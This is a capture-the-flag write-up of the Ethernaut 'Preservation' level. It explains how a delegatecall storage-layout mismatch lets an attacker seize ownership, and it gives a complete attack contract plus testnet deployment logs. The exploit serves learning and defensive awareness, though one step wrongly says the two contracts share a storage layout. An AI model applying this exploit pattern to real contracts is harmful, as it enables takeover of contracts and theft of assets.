# 16 - Preservation

## Challenge

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Understanding what it means for `delegatecall` to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

## Summary

Before reading the level contract, first go through the new concepts introduced in the challenge description. There is a very nice [article](https://celo.academy/t/preventing-vulnerabilities-in-solidity-delegate-call/38) on `delegatecall`, how it works and its main vulnerabilities.

`delegatecall` has a property known as "context preservation". This means that the `delegatecall` will execute in the context of the calling contract. The code is executed in the context of the caller rather than the callee. There are 2 main vulnerabilities of `delegatecall` as indicated in the article:

- The context-preserving nature of DelegateCall
- Ensuring that the storage layout of both the Caller and Receiver is the same.

The detailed example, code and explanation can be seen in the article so I won't repeat here. Now let's go back to the level contract.

Firstly, there's `contract LibraryContract` which will be called in `delegatecall` from `timeZone1Library` or `timeZone2Library`. We now know that contract is vulnerable if the caller and callee have different storage layout.

```js
contract Preservation {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
}

contract LibraryContract {
  uint storedTime;  
}
```

Apparently we have a similar scenario here, since `Preservation` has 4 storage variables while `LibraryContract` has only 1. This means that we can potentially exploit it according to the article. To set `owner` we can do the following things:

1. Write an attack contract that has the same layout as `Preservation` and will implement an `attack` function that calls `setFirstTime` twice. It also needs `setTime` function for later usage:

```js
function attack() public {
    // override address of timeZone1Library
    preservation.setFirstTime(uint(address(this)));
    // call setFirstTime again with any number as input.
    preservation.setFirstTime(1);
}

function setTime(uint _time) public {
    owner = tx.origin;
}
```

2. When `attack` is called from attack contract, we first call `preservation.setFirstTime(uint(address(this)))`. the following code in `Preservation` is executed:

```js
function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}
```

This calls into `LibraryContract`, which sets `storedTime` to `address(this)`. Since `LibraryContract` has the same storage layout as `Preservation`, this will update `timeZone1Library` with the address of the attack contract.

3. Now, if we call `preservation.setFirstTime(1);`, it makes a `delegatecall` to `LibraryContract` by using the value stored in the `LibraryContract` state variable. However, the value has been updated by the previous call. This means the function will make a `delegatecall` to the attack contract.

4. This means we will call this:

```js
function setTime(uint _time) public {
    owner = tx.origin;
}
```

Which `owner` will be updated? Since we execute everything from `preservation`, the `Preservation` contract's `owner` will be updated to `tx.origin`, which is actually us. Now we claim ownership of the contract.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0x759699ae49B8b33112316d8F6Bd30e0E334498ce'
```

Check some level information:

```js
> await contract.owner()
'0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC'
> await contract.timeZone1Library()
'0x9f6F8698306cA3FE9135979bFfba4186032Cb61e'
```

Deploy contract:

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    IPreservation preservation;

    constructor(address _addr) {
        preservation = IPreservation(_addr);
    }

    function attack() public {
        // override address of timeZone1Library
        preservation.setFirstTime(uint256(uint160(address(this))));
        // call the function with any number as input.
        preservation.setFirstTime(1);
    }

    function setTime(uint _time) public {
        owner = tx.origin;
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['Attack']
>>>
>>> attackContract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> attackContract.deploy(contract_addr)
2023-06-22 22:34:01.217 | DEBUG    | cheb3.contract:deploy:94 - Deploying contract ...
2023-06-22 22:34:07.339 | INFO     | cheb3.contract:deploy:99 - The contract is deployed at 0x62505DCa806E53Cde958514F4c176074a444c370
```

Code is pretty much what we explained before. Now we just call into `attack`:

```py
>>> attackContract.functions.attack().send_transaction()
2023-06-22 22:34:16.512 | INFO     | cheb3.contract:send_transaction:236 - (0x62505DCa806E53Cde958514F4c176074a444c370).attack transaction hash: 0x83a4b5b49fb2a33c0facb459c33af4ac88d0e3c05f43370e891e7a072bcdb307
```

As mentioned before, first `setFirstTime` will update `timeZone1Library` with the address of the attack contract. Then the second call will call into the attack contract, which will update `owner` in `Preservation`.

```js
> await contract.timeZone1Library()
'0x62505DCa806E53Cde958514F4c176074a444c370' // same as deployed attack contract address
> await contract.owner()
'0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB' // us
```

Finally, submit the instance to pass the level.

## Afterword

As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.
